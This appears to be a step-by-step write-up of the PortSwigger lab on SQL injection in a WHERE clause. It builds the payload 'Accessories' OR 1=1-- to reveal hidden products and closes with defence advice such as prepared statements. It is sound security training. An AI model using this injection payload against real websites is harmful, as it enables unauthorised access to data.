# 📘 PortSwigger Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

<a id="top"></a>

> 🔗 Lab:
> https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

---

# 📑 Table of Contents

- [🎯 Goal](#goal)
- [🧠 What is SQL Injection](#idea)
- [🏗 How the vulnerability works](#how)
- [🔍 Step 1 — Analyze the URL](#step1)
- [🔍 Step 2 — Analyze the SQL query](#step2)
- [🔍 Step 3 — Find the injection point](#step3)
- [🔍 Step 4 — Test SQL comments](#step4)
- [🔍 Step 5 — Build the payload](#step5)
- [🔍 Step 6 — Retrieve hidden products](#step6)
- [💥 Why the attack worked](#why)
- [🛡 Defense recommendations](#defense)
- [🛠 Researcher checklist](#checklist)

---

<a id="goal"></a>

# 🎯 Goal

Retrieve hidden (unreleased) products using SQL Injection in the category parameter.

---

<a id="idea"></a>

# 🧠 What is SQL Injection

SQL Injection happens when an application:

- accepts user input;
- inserts it directly into SQL queries;
- does not sanitize special characters.

---

# Example of a normal query

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

---

# Dangerous part

If a user can modify part of the SQL query,
they may:

- read hidden data;
- bypass restrictions;
- change query logic.

---

<a id="how"></a>

# 🏗 How the vulnerability works

The application uses:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

---

# What released = 1 means

This condition shows only published products.

Most likely:

```text
released = 1 -> published
released = 0 -> hidden
```

---

# Our goal

We need to bypass:

```sql
AND released = 1
```

---

<a id="step1"></a>

# 🔍 Step 1 — Analyze the URL

Open a product category.

Example:

```http
/filter?category=Accessories
```

---

# Important observation

The parameter:

```text
category=Accessories
```

is inserted into a SQL query.

---

# Backend likely builds

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

---

<a id="step2"></a>

# 🔍 Step 2 — Analyze the SQL query

Let's break it down.

---

```sql
SELECT * FROM products
```

means:

> retrieve all products.

---

```sql
WHERE category = 'Accessories'
```

means:

> only Accessories products.

---

```sql
AND released = 1
```

means:

> only published products.

---

# Vulnerable part

The user controls:

```sql
'Accessories'
```

---

<a id="step3"></a>

# 🔍 Step 3 — Find the injection point

Send the request to Burp Repeater.

---

# Test a single quote

```http
GET /filter?category=Accessories'
```

---

# Possible results

- SQL error;
- changed response;
- unusual behavior.

---

# Why this matters

A single quote:

```sql
'
```

is used in SQL strings.

If the query breaks,
our input affects SQL syntax.

---

<a id="step4"></a>

# 🔍 Step 4 — Test SQL comments

SQL supports comments.

Example:

```sql
--
```

---

# What it does

Everything after it is ignored.

---

# Example

```sql
SELECT * FROM users -- comment
```

SQL executes only:

```sql
SELECT * FROM users
```

---

# Why this matters

We can remove the rest of the query.

---

<a id="step5"></a>

# 🔍 Step 5 — Build the payload

Use:

```http
/filter?category=Accessories'+OR+1=1--
```

---

# What + means

In URLs:

```text
+ = space
```

---

# Final payload becomes

```sql
Accessories' OR 1=1--
```

---

# Final SQL query

```sql
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

---

# What happens here

## 1. Close the string

```sql
Accessories'
```

---

## 2. Add a condition

```sql
OR 1=1
```

---

# Why it works

```sql
1=1
```

is always TRUE.

---

# What OR does

If at least one condition is TRUE,
the whole WHERE becomes TRUE.

---

## 3. Comment out the rest

```sql
--
```

removes:

```sql
AND released = 1
```

---

<a id="step6"></a>

# 🔍 Step 6 — Retrieve hidden products

After sending:

```http
/filter?category=Accessories'+OR+1=1--
```

the application shows:

- published products;
- hidden products;
- products from other categories.

---

# Successful result

The lab is solved automatically.

---

<a id="why"></a>

# 💥 Why the attack worked

Because the application:

- trusted user input;
- did not use prepared statements;
- inserted data directly into SQL.

---

# Main problem

Backend likely did something like:

```php
$sql = "SELECT * FROM products WHERE category = '$category'";
```

This is unsafe.

---

<a id="defense"></a>

# 🛡 Defense recommendations

## 1. Prepared Statements

Most important protection.

---

# Safe example

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = ?");
```

---

## 2. Parameterized queries

Never insert user input directly into SQL.

---

## 3. Input validation

Allow only expected values.

Example:

```text
Accessories
Pets
Tech
```

---

## 4. Least privilege

The SQL user should not have unnecessary permissions.

---

<a id="checklist"></a>

# 🛠 Researcher checklist

- [ ] parameter identified
- [ ] SQL influence confirmed
- [ ] SQL comment syntax identified
- [ ] boolean condition tested
- [ ] hidden data retrieved
- [ ] SQL Injection confirmed

---

# 🧠 What a pentester should remember

SQL Injection is not magic
and not just “payloads”.

It is:
- SQL syntax control;
- changing WHERE logic;
- understanding backend query construction.

---

# ⬆ Back to top

[Return to top](#top)
